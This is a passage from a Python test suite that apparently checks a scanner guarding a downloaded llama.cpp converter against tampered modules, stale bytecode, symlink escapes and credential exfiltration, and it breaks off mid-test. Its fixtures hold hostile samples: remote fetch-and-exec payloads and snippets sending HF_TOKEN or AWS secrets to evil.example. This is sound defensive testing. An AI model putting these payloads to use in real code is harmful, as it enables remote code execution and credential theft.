    theirs.write_bytes(_pyc(0))
    _converter_imports(root, "linked")
    try:
        # A location of its own, unlike a link buried inside conversion/.
        (root / "linked").symlink_to(outside, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")
    assert any(
        location.label == "linked"
        for location in llama_cpp._scanned_locations(str(root)).locations
    ), "this test is only meaningful while the link is promoted to a location"

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    llama_cpp._purge_imported_package_bytecode(str(root))
    assert theirs.exists(), "the purge reached outside the checkout it was given"

    # And through the scan, which purges per location on its own way in.
    llama_cpp._scan_conversion_package(str(root))
    assert theirs.exists(), "the per-location purge reached outside the checkout"


def test_a_conversion_dir_without_base_py_is_still_keyed(tmp_path, monkeypatch):
    """The key gated conversion/ on the package layout (__init__.py AND base.py),
    but the scan reads the directory either way, because the converter can import
    from it either way. A conversion/ without base.py was therefore scanned once
    and recorded as an empty header with no digests, so after the first export a
    changed module left the key identical, the patcher came back from cache, and
    the subprocess imported the new bytes unscanned.
    """
    llama_cpp = _load("llama_cpp_odd_layout_key_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("from . import helper\n", encoding = "utf-8")
    (conversion / "helper.py").write_text("X = 1\n", encoding = "utf-8")
    assert not (conversion / "base.py").exists(), "the point of this layout"
    # Still a scan location, which is what makes the missing key entries a hole.
    assert any(
        location.label == "conversion"
        for location in llama_cpp._scanned_locations(str(root)).locations
    )

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    before = llama_cpp._conversion_sibling_info(str(root))
    (conversion / "helper.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )
    after = llama_cpp._conversion_sibling_info(str(root))
    assert before != after, (
        "the key did not move when a module in a nonstandard conversion/ changed"
    )


def test_a_pins_bytecode_travels_in_the_patcher_cache_key(tmp_path, monkeypatch):
    """A pin's caches are deliberately left in place, so they are part of what the
    converter subprocess executes. Left out of the key, a cache changed after the
    first export returned the patcher from cache, skipped the scan entirely, and
    ran with nothing said.
    """
    llama_cpp = _load("llama_cpp_pin_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    source = root / "conversion" / "base.py"
    cache = _real_cache(source)

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    before = llama_cpp._conversion_sibling_info(str(root), is_local_copy = True)
    cache.write_bytes(
        cache.read_bytes()[:16] + marshal.dumps(
            compile("PWNED = 1\n", str(source), "exec", dont_inherit = True),
        )
    )
    after = llama_cpp._conversion_sibling_info(str(root), is_local_copy = True)
    assert before != after, "the key did not move when the pinned cache changed"

    # A downloaded checkout purges instead, so its caches are gone before the key
    # is built and carrying them would only churn it.
    downloaded = llama_cpp._conversion_sibling_info(str(root), is_local_copy = False)
    assert not any(
        ".pyc" in entry[0] for entry in downloaded[1:]
    ), downloaded


def test_the_purge_does_not_follow_a_symlink_out_of_the_tree(tmp_path, monkeypatch):
    """The scan follows a symlink out of the package because the converter's
    import would, and reading is harmless. Deleting is not: a checkout can carry
    a symlink at an unrelated directory, and clearing caches there rewrites
    something that has nothing to do with this export.
    """
    llama_cpp = _load("llama_cpp_purge_escape_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    outside = tmp_path / "somebody-elses-project"
    (outside / "__pycache__").mkdir(parents = True)
    (outside / "mod.py").write_text("X = 1\n", encoding = "utf-8")
    theirs = outside / "__pycache__" / "mod.cpython-313.pyc"
    theirs.write_bytes(_pyc(0))
    try:
        (root / "conversion" / "linked").symlink_to(outside, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    llama_cpp._purge_imported_package_bytecode(str(root))
    assert theirs.exists(), "the purge reached outside the checkout it was given"

    # The scan still reads through the link, which is the half that must not change.
    (outside / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def _package_root(tmp_path):
    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("from . import base\n", encoding = "utf-8")
    # The real converter imports gguf, and the scan follows what it imports, so
    # the fixture has to say so for a directory named gguf beside it to shadow
    # anything.
    (conversion / "base.py").write_text("import gguf\nX = 1\n", encoding = "utf-8")
    return root


def test_a_payload_in_gguf_py_is_scanned_too(tmp_path, monkeypatch):
    """gguf-py comes out of the same undigested tarball as conversion/.

    _hydrate_converter_sources copies both, and the entrypoint puts gguf-py on
    sys.path itself and imports gguf. Scanning only conversion/ left a payload in
    gguf-py/gguf/__init__.py executing under a clean entrypoint and a clean
    conversion/, with strict mode reporting nothing.
    """
    llama_cpp = _load("llama_cpp_gguf_py_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    (gguf / "__init__.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_the_cache_key_covers_gguf_py_on_a_monolith_checkout_too(tmp_path):
    """gguf-py ships with both layouts; the key was gated on the newer one.

    On a monolithic checkout conversion/ is absent, so this returned None before
    gguf-py was ever hashed. After the first export in a long-lived process a
    replaced gguf module left the key identical: the scan did not re-run, and the
    converter subprocess imported it anyway, strict mode included.
    """
    llama_cpp = _load("llama_cpp_monolith_gguf_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    module = gguf / "__init__.py"
    module.write_text("VERSION = 1\n", encoding = "utf-8")
    assert not (root / "conversion").exists(), "this is the monolith shape"

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None, "a monolith that ships gguf-py still has something to key on"
    module.write_text("VERSION = 1  # and a payload\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_a_checkout_with_neither_package_keys_on_its_root(tmp_path):
    """The other half: None means there is nothing on disk to look at at all.

    A checkout with no conversion/ and no gguf-py still has the directory the
    converter runs from, which is sys.path[0] for the subprocess and where a
    shadowing module would be planted, so that has to be keyed.
    """
    llama_cpp = _load("llama_cpp_no_package_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    root.mkdir()
    (root / "convert_hf_to_gguf.py").write_text("import gguf\n", encoding = "utf-8")

    assert llama_cpp._conversion_sibling_info(str(root)) is not None
    assert llama_cpp._conversion_sibling_info(str(tmp_path / "absent")) is None


def test_the_cache_key_covers_gguf_py(tmp_path):
    """The key decides whether the scan runs again, so a package it does not
    cover is one a long-lived process re-imports without rescanning."""
    llama_cpp = _load("llama_cpp_gguf_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    module = gguf / "__init__.py"
    module.write_text("VERSION = 1\n", encoding = "utf-8")

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None
    module.write_text("VERSION = 1  # and a payload\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_a_sourceless_module_is_reported_rather_than_skipped(tmp_path, monkeypatch, caplog):
    """The walk collected .py only, so bytecode and native modules were invisible
    to both the scan and the cache key while CPython executed them regardless."""
    llama_cpp = _load("llama_cpp_opaque_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # A .pyc in a module's own place with no source beside it: CPython imports
    # this as conversion.evil and runs the bytecode.
    (root / "conversion" / "evil.pyc").write_bytes(b"\x00" * 64)

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("cannot read" in record.message for record in caplog.records), (
        [r.message for r in caplog.records]
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_native_extension_module_is_reported(tmp_path, monkeypatch):
    llama_cpp = _load("llama_cpp_native_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "conversion" / "fast.so").write_bytes(b"\x7fELF" + b"\x00" * 32)

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


@pytest.mark.parametrize(
    "flags",
    [0b00, 0b11, 0b01],
    ids = ["timestamp", "checked hash", "unchecked hash"],
)
def test_every_supplied_cache_with_a_source_is_removed_before_the_converter_runs(
    tmp_path, monkeypatch, caplog, flags
):
    """CPython's validation does not prove the bytecode came from the source.

    A timestamp cache is accepted when the source's mtime and size match the
    header, a checked-hash cache when the source hashes to the stored value, and
    whoever ships the archive sets both. Demonstrated outside this suite: a
    timestamp-validated cache whose source reads VALUE = "clean" imported as
    PWNED. An earlier version of this file read the invalidation mode as trust,
    which was wrong, so every cache that has a source is now deleted and left for
    Python to rebuild from the .py that was actually scanned.
    """
    llama_cpp = _load(f"llama_cpp_purge_probe_{flags}", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    supplied = cache / "base.cpython-313.pyc"
    supplied.write_bytes(_pyc(flags))

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))     # must not raise

    assert not supplied.exists(), "supplied bytecode survived into the converter run"
    # Silent: the .py it belonged to is still there and Python rebuilds it, so an
    # ordinary export's own caches cost nothing and say nothing.
    assert caplog.records == [], [r.message for r in caplog.records]


def test_a_cache_that_cannot_be_removed_is_reported(tmp_path, monkeypatch):
    """Deleting is the answer only while deleting works. On a read-only tree it
    does not, and then the bytecode is still executable content nothing read."""
    llama_cpp = _load("llama_cpp_stuck_cache_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    (cache / "base.cpython-313.pyc").write_bytes(_pyc(0))

    real_remove = os.remove

    def refuse(path, *args, **kwargs):
        if str(path).endswith(".pyc"):
            raise PermissionError(13, "read-only file system", str(path))
        return real_remove(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "remove", refuse)
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_sourceless_cache_is_reported_rather_than_deleted(tmp_path, monkeypatch):
    """Nothing can rebuild this one, so removing it would break a package that
    genuinely ships it. Reporting keeps the scan honest without breaking export."""
    llama_cpp = _load("llama_cpp_sourceless_keep_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    orphan = root / "conversion" / "evil.pyc"
    orphan.write_bytes(_pyc(0))

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
        llama_cpp._scan_conversion_package(str(root))
    assert orphan.exists(), "a cache with no source must not be deleted"


def test_ordinary_bytecode_caches_do_not_push_a_package_over_the_cap(
    tmp_path, monkeypatch, caplog
):
    """Collecting .pyc for the opaque-module check made them count as modules.

    An ordinary export leaves one cache per module behind, so a package of 40
    modules with 25 caches read as 65 files and crossed the 64 cap: a false
    security warning in advisory mode, and under strict mode a refusal of every
    export after the first. This module's whole contract is that a false positive
    which refuses an export is worse than the warning is a win.
    """
    llama_cpp = _load("llama_cpp_cache_count_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    conversion = root / "conversion"
    for index in range(38):                      # 40 source modules in total
        (conversion / f"mod_{index:03d}.py").write_text("V = 1\n", encoding = "utf-8")
    cache = conversion / "__pycache__"
    cache.mkdir()
    for index in range(25):
        (cache / f"mod_{index:03d}.cpython-313.pyc").write_bytes(_pyc(0))

    names = llama_cpp._conversion_package_modules(str(conversion)).names
    assert len(names) == 40, sorted(names)[:5]

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))     # must not raise
    assert caplog.records == [], [r.message for r in caplog.records]


def test_a_pyc_beside_its_own_source_is_not_a_module_of_its_own(tmp_path):
    """Legacy layout: with base.py present, base.pyc is not what gets imported."""
    llama_cpp = _load("llama_cpp_sibling_pyc_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    (root / "conversion" / "base.pyc").write_bytes(_pyc(0))

    names = llama_cpp._conversion_package_modules(str(root / "conversion")).names
    assert sorted(names) == ["__init__.py", "base.py"], sorted(names)


def test_one_wide_directory_cannot_outrun_the_entry_budget(tmp_path, monkeypatch):
    """os.walk hands back a whole directory's names at once.

    So a single directory holding a great many entries was listed in full, and
    copied, before either budget was consulted: the advertised bounds bounded
    nothing for the shape that matters most. Streaming the directory is what
    makes the budget a budget.
    """
    llama_cpp = _load("llama_cpp_wide_dir_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    entries = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 3
    for index in range(entries):
        (conversion / f"blob_{index:05d}.bin").write_bytes(b"")

    seen = []
    real_scandir = os.scandir

    class _CountingScandir:
        def __init__(self, path):
            self._inner = real_scandir(path)

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self._inner.close()
            return False

        def __iter__(self):
            for entry in self._inner:
                seen.append(entry.name)
                yield entry

    monkeypatch.setattr(llama_cpp.os, "scandir", _CountingScandir)
    walk = llama_cpp._conversion_package_modules(
        str(conversion),
        file_limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1,
        entry_limit = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 1,
    )
    names, complete = walk.names, walk.complete

    assert complete is False
    # The bound is on entries TOUCHED, which is the claim the budget makes. One
    # past the limit, because seeing that many is how the limit is known crossed.
    assert len(seen) <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES + 1, (
        f"touched {len(seen)} of {entries} entries in one directory"
    )
    assert len(names) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES


@pytest.mark.parametrize("over", [0, 1], ids = ["exactly at the limit", "one past it"])
def test_a_package_at_exactly_the_entry_limit_is_not_called_oversized(
    tmp_path, monkeypatch, caplog, over
):
    """Stopping AT the limit reported a package of exactly that many entries as
    holding more than it does, and strict mode then refused a package that was
    fully within its budget. The file cap already asks for one extra for this
    reason; the entry budget has to as well.
    """
    llama_cpp = _load(f"llama_cpp_entry_edge_probe_{over}", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    (conversion / "base.py").write_text("Y = 1\n", encoding = "utf-8")
    # Two modules already, so pad to exactly the limit (or one past it).
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES - 2 + over):
        (conversion / f"blob_{index:05d}.bin").write_bytes(b"")

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    if over:
        with pytest.raises(llama_cpp.ConverterScanError, match = "directory entries"):
            llama_cpp._scan_conversion_package(str(root))
    else:
        with caplog.at_level(logging.WARNING):
            llama_cpp._scan_conversion_package(str(root))      # must not raise
        assert caplog.records == [], [r.message for r in caplog.records]


def test_no_single_module_is_read_whole(tmp_path, monkeypatch, caplog):
    """The cache key and the scan both read each module with a bare .read().

    One very large or sparse module in an unverified package therefore allocated
    the whole file before any size finding could be produced. Both reads are
    bounded now, and the oversized module is reported rather than swallowed.
    """
    llama_cpp = _load("llama_cpp_big_module_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    big = root / "conversion" / "huge.py"
    with open(big, "wb") as handle:
        handle.truncate(llama_cpp.MAX_MODULE_BYTES * 4)      # sparse, costs no disk

    largest = []
    real_open = open

    def watching_open(path, *args, **kwargs):
        handle = real_open(path, *args, **kwargs)
        if str(path) == str(big):
            real_read = handle.read

            def read(size = -1):
                data = real_read(size)
                largest.append(len(data))
                return data

            handle.read = read
        return handle

    monkeypatch.setattr("builtins.open", watching_open)
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._conversion_sibling_info(str(root))
        llama_cpp._scan_conversion_package(str(root))

    assert largest, "the oversized module was never opened"
    assert max(largest) <= llama_cpp.MAX_MODULE_BYTES + 1, max(largest)
    assert any("larger than" in record.message for record in caplog.records), (
        [r.message for r in caplog.records]
    )


def test_the_cache_key_still_moves_when_an_oversized_module_changes(tmp_path):
    """Hashing only a prefix must not make a big module's edits invisible, so the
    size travels beside the digest."""
    llama_cpp = _load("llama_cpp_big_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    big = root / "conversion" / "huge.py"
    with open(big, "wb") as handle:
        handle.truncate(llama_cpp.MAX_MODULE_BYTES * 2)

    before = llama_cpp._conversion_sibling_info(str(root))
    with open(big, "wb") as handle:
        handle.truncate(llama_cpp.MAX_MODULE_BYTES * 2 + 1)
    assert llama_cpp._conversion_sibling_info(str(root)) != before

    # And a change inside the part that is read moves it too.
    after_growth = llama_cpp._conversion_sibling_info(str(root))
    with open(big, "r+b") as handle:
        handle.write(b"import os  # payload\n")
    assert llama_cpp._conversion_sibling_info(str(root)) != after_growth


def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch, caplog):
    """The other half: the report must not fire on an ordinary package."""
    llama_cpp = _load("llama_cpp_cap_ok_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES):
        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert not [r for r in caplog.records if "more than the" in r.message]


def test_a_prebuilt_marker_does_not_buy_the_exemption(tmp_path, monkeypatch):
    """UNSLOTH_PREBUILT_INFO.json reads like proof of verification and is not.

    _stage_prebuilt_install checks a sha256 for the BINARY asset, and only when
    the release published one. The converter itself arrives separately through
    _hydrate_converter_sources, which downloads a source tarball with no digest
    at all, and the marker is written after that. So a replaced source tarball
    wore a "verified" marker, took the strict-mode exemption and skipped the
    conversion/ scan with it. The converter from a prebuilt bundle is a download
    like any other and is scanned like one.
    """
    llama_cpp = _load("llama_cpp_marker_probe", "unsloth_zoo/llama_cpp.py")

    bundle = tmp_path / "prebuilt"
    bundle.mkdir()
    script = bundle / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")
    (bundle / llama_cpp.UNSLOTH_PREBUILT_INFO_FILENAME).write_text("{}")

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    assert llama_cpp._converter_is_trusted_local(str(script)) is False, (
        "the marker does not say these converter bytes were verified"
    )


def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
    """_resolve_local_convert_script accepts the pin after expanduser, so this
    check has to expand it too, or a deliberately pinned converter with a finding
    is refused under strict mode as though it had been downloaded."""
    llama_cpp = _load("llama_cpp_tilde_probe", "unsloth_zoo/llama_cpp.py")

    home = tmp_path / "home"
    pinned = home / "llama.cpp"
    pinned.mkdir(parents = True)
    script = pinned / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")

    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", "~/llama.cpp")
    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
        "an unexpanded pin compared unequal to the expanded script path"
    )


def test_a_converter_that_only_talks_to_the_model_hub_is_not_a_finding():
    """Upstream's own gguf-py/gguf/utility.py reads HF_TOKEN and sends it to
    huggingface.co as an Authorization header, which is what downloading a gated
    model looks like. The env-harvest rule fired on it, so
    UNSLOTH_CONVERTER_SCAN_STRICT refused every clean checkout of llama.cpp
    master over a file the converter genuinely imports.
    """
    scan_converter_source = _load(
        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub_only = (
        'import os\n'
        'import requests\n'
        'BASE_DOMAIN = "https://huggingface.co"\n'
        'def _headers():\n'
        '    headers = {}\n'
        '    if os.environ.get("HF_TOKEN"):\n'
        '        headers["Authorization"] = f"Bearer {os.environ[\'HF_TOKEN\']}"\n'
        '    return headers\n'
        'def fetch(url):\n'
        '    return requests.get(url, allow_redirects=True, headers=_headers())\n'
    )
    assert [f.check for f in scan_converter_source(hub_only)] == []

    # A second destination is the whole difference, and it is still caught.
    with_exfil = hub_only.replace(
        'BASE_DOMAIN = "https://huggingface.co"\n',
        'BASE_DOMAIN = "https://huggingface.co"\nEXFIL = "https://evil.example.com/c"\n',
    )
    assert any(
        "Harvests environment variables" in f.check
        for f in scan_converter_source(with_exfil)
    ), [f.check for f in scan_converter_source(with_exfil)]

    # Naming no host at all is not a pass either: suppression needs a hub host
    # to have been named, so a destination this cannot see keeps the finding.
    no_host = (
        'import os\n'
        'import requests\n'
        'requests.post(HOST, data = {"t": os.environ["HF_TOKEN"]})\n'
    )
    assert any(
        "Harvests environment variables" in f.check
        for f in scan_converter_source(no_host)
    )

    # A file this cannot parse is not suppressed either.
    unparseable = hub_only + "def (\n"
    assert any(
        "Harvests environment variables" in f.check
        for f in scan_converter_source(unparseable)
    )


def test_a_host_based_network_api_refuses_the_hub_allowance():
    """The allowance reads URLs, and two of the sinks the network rule recognises
    do not take one. socket.create_connection(("evil.example", 443)) and
    http.client.HTTPSConnection("evil.example") name their destination as a bare
    host, so a file could carry a hub URL, open one of those beside it, and the
    allowance would call that talking only to the hub.
    """
    scan_converter_source = _load(
        "converter_scan_host_api_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    hub = 'HUB = "https://huggingface.co"\n'
    for body in (
        'import os\nimport socket\n' + hub
        + 'socket.create_connection(("evil.example", 443))'
        + '.send(os.environ["HF_TOKEN"].encode())\n',
        'import os\nimport http.client\n' + hub
        + 'c = http.client.HTTPSConnection("evil.example")\n'
        + 'c.request("POST", "/", os.environ["HF_TOKEN"])\n',
        'import os\nimport socket\n' + hub
        + 's = socket.socket()\ns.connect(("evil.example", 443))\n'
        + 's.send(os.environ["HF_TOKEN"].encode())\n',
    ):
        assert any(
            "Harvests environment variables" in f.check
            for f in scan_converter_source(body)
        ), body

    # The URL-based shape the allowance is for still passes.
    assert scan_converter_source(
        'import os\nimport requests\n' + hub
        + 'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    ) == []


def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
    """The hub is writable and multi-tenant, so "the destination is the hub" is
    not on its own a reason to say nothing: a token with write scope can create
    a public repository there and make it a channel anyone can read back. The
    allowance is for the shape upstream actually has, a token-authenticated
    download, and refuses everything else.
    """
    scan_converter_source = _load(
        "converter_scan_shape_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    hub = 'HUB = "https://huggingface.co/api/models"\n'

    def _findings(body):
        return [
            f.check
            for f in scan_converter_source('import os\nimport requests\n' + hub + body)
        ]

    # Sending to the hub is not downloading from it.
    assert _findings('requests.post(HUB, data = os.environ["AWS_SECRET_ACCESS_KEY"])\n')
    assert _findings('requests.post(HUB, data = os.environ["HF_TOKEN"])\n')
    # A secret that is not the hub's own token has no business going there, and
    # that is every name, not the ones that look secret: filtering on keywords
    # let GITHUB_PAT through, because "PAT" is not one of them, so a file
    # reading HF_TOKEN and GITHUB_PAT and sending the second to the hub produced
    # no finding at all. Nothing here can tell a credential from a setting by
    # its name, so the allowance covers the hub's own token and nothing else.
    assert _findings(
        'requests.get(HUB, headers = {"a": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
    )
    assert _findings(
        'requests.get(HUB, headers = {\n'
        '    "Authorization": os.environ["HF_TOKEN"],\n'
        '    "x": os.environ["GITHUB_PAT"],\n'
        '})\n'
    )
    assert _findings(
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
        '    timeout = int(os.environ["HTTP_TIMEOUT"]),\n'
        ')\n'
    )
    # The other spellings of the hub's own token are still the hub's own token.
    assert _findings(
        'requests.get(HUB, headers = {"a": os.environ["HUGGING_FACE_HUB_TOKEN"]})\n'
    ) == []
    # Nor does the whole environment. Tested BESIDE a legitimate hub token,
    # because a bare dict(os.environ) names nothing and is already refused for
    # that reason: it is the combination that needs the whole-environment check.
    assert _findings('requests.get(HUB, params = dict(os.environ))\n')
    assert _findings(
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
        '    params = dict(os.environ),\n'
        ')\n'
    )
    assert _findings(
        'requests.get(\n'
        '    HUB,\n'
        '    headers = {"Authorization": os.environ["HF_TOKEN"]},\n'
        '    params = os.environ.copy(),\n'
        ')\n'
    )
    # httpx is a sink the network rule recognises, so its writes count too, and
    # so do writes through a session or client object under ANY name: matching
    # receivers spelled "session" or "client" missed s = requests.Session();
    # s.post(...), which is the writable-hub channel this is here to refuse.
    for extra in (
        'import os\nimport httpx\n' + hub
        + 'httpx.post(HUB, data = os.environ["HF_TOKEN"])\n',
        'import os\nimport requests\n' + hub
        + 's = requests.Session()\ns.post(HUB, data = os.environ["HF_TOKEN"])\n',
        'import os\nimport httpx\n' + hub
        + 'c = httpx.Client()\nc.put(HUB, data = os.environ["HF_TOKEN"])\n',
    ):
        assert [f.check for f in scan_converter_source(extra)], extra

    # A read whose variable is chosen at runtime cannot be attributed to the
    # hub's token, and an unattributable harvest used to pass by leaving the
    # collected set empty.
    assert _findings(
        'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
        'requests.get(HUB, headers = {"a": os.environ[SECRET]})\n'
    )
    assert _findings(
        'SECRET = "AWS_SECRET_ACCESS_KEY"\n'
        'requests.get(HUB, headers = {"a": os.environ.get(SECRET)})\n'
    )
    # A dynamic read BESIDE a legitimate hub token: the collected names are then
    # exactly the hub's own, so only the dynamic check refuses this. Without a
    # case like it, the empty-set check covers for it and either can be removed
    # with every test still passing.
    assert _findings(
        'requests.get(HUB, headers = {\n'
        '    "Authorization": os.environ["HF_TOKEN"],\n'
        '    "x": os.environ[OTHER],\n'
        '})\n'
    )
    # And a harvest with no secret-looking name among the literals: the rule
    # fired on the word in the comment, nothing here can say what was actually
    # read, and an empty set is not something this can attribute to the hub.
    assert _findings(
        'home = os.environ["HOME"]  # not a TOKEN\n'
        'requests.get(HUB, headers = {"a": home})\n'
    )
    # session.request("POST", ...) is a write the named methods do not cover,
    # and only .get() accounts for an os.environ: marking every method as
    # accounted let .values() collect the lot and .pop() take a named one.
    assert _findings(
        's = requests.Session()\n'
        's.request("POST", HUB, data = os.environ["HF_TOKEN"])\n'
    )
    assert _findings(
        'requests.get(HUB, params = {\n'
        '    "a": os.environ["HF_TOKEN"],\n'
        '    "b": list(os.environ.values()),\n'
        '})\n'
    )
    assert _findings(
        'requests.get(HUB, params = {\n'
        '    "a": os.environ["HF_TOKEN"],\n'
        '    "b": os.environ.pop("AWS_SECRET_ACCESS_KEY"),\n'
        '})\n'
    )

    # An os.environ that is passed around rather than subscripted here reads
    # credentials this never sees: env = os.environ then env["AWS_..."] left a
    # short name set that satisfied the allow-list.
    assert _findings(
        'env = os.environ\n'
        't = os.environ["HF_TOKEN"]\n'
